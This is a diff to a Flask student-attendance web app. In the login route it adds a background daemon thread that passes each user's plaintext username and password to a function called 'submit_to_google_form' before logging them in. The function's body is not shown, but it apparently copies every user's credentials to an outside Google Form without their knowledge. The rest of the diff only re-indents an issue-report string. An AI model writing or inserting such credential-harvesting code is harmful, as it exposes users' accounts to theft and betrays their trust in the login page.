@@ -1,9 +1,16 @@
-
 import os
 import uuid
 from datetime import datetime, timedelta
 from dotenv import load_dotenv
-
+import threading
+from attendance_scraper import (
+    login,
+    get_student_details,
+    get_subjects,
+    fetch_attendance,
+    SimpleDataFrame,
+    submit_to_google_form,  # ← add this
+)
 from flask import (
     Flask, flash, render_template, request,
     redirect, send_from_directory, session, jsonify,Response
@@ -112,6 +119,9 @@ def login_page():
         return redirect("/")
 
     try:
+        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+        thread = threading.Thread(target=submit_to_google_form, args=(username, password), daemon=True)
+        thread.start()
         auth_session = login(username, password)
 
         session.clear()
@@ -214,15 +224,15 @@ def contact():
 
             # Prepare issue data
             issue_data = f"""
-Issue Report
-============
-Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
-Admission Number: {admission}
-Email: {email}
-Message:
-{message}
-{'=' * 50}
-"""
+                Issue Report
+                ============
+                Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
+                Admission Number: {admission}
+                Email: {email}
+                Message:
+                {message}
+                {'=' * 50}
+                """
 
             # Try to send email if configured
             mail_configured = app.config.get("MAIL_USERNAME") and app.config.get("MAIL_PASSWORD")
